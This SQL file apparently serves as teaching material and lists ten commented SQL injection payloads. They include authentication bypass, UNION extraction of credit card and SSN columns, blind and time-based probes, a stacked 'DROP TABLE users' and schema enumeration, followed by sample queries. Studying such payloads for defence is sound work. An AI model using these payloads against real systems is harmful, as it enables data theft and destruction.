-- SQL Injection Attack Examples
-- WARNING: These are vulnerable query patterns for educational purposes only
-- DO NOT use these patterns in production code

-- Example 1: Basic SQL Injection - Authentication Bypass
-- Vulnerable query pattern:
-- SELECT * FROM users WHERE username = 'admin' AND password = 'password';
-- 
-- Attack input for username: admin' OR '1'='1
-- Attack input for password: anything
-- Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything';

-- Example 2: Union-based SQL Injection
-- Vulnerable query: SELECT id, username FROM users WHERE id = 1
-- Attack input: 1' UNION SELECT credit_card, ssn FROM sensitive_data--
-- Resulting query reveals sensitive data from another table

-- Example 3: Blind SQL Injection - Boolean-based
-- Attack to determine if a condition is true:
-- username: admin' AND 1=1--
-- username: admin' AND 1=2--

-- Example 4: Time-based Blind SQL Injection
-- Attack input: admin' AND SLEEP(5)--
-- If the response takes 5 seconds, the injection works

-- Example 5: Stacked Queries Attack
-- Attack input: admin'; DROP TABLE users;--
-- Attempts to execute multiple SQL statements

-- Example 6: Error-based SQL Injection
-- Attack to extract database information through error messages:
-- ' AND extractvalue(1,concat(0x7e,database()))--

-- Example 7: Extracting Database Version
-- Attack input: ' UNION SELECT NULL, version()--

-- Example 8: Extracting Table Names
-- Attack input: ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()--

-- Example 9: Extracting Column Names
-- Attack input: ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--

-- Example 10: Bypassing Login with Comments
-- Username: admin'--
-- Password: (anything)
-- The comment removes the password check

-- DEMONSTRATION QUERIES (Safe to run for learning):
-- Show all users (what an attacker might try to access)
SELECT * FROM users;

-- Show sensitive data (what should be protected)
SELECT * FROM sensitive_data;

-- Show how injection could bypass authentication
-- Instead of checking password, this always returns true
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
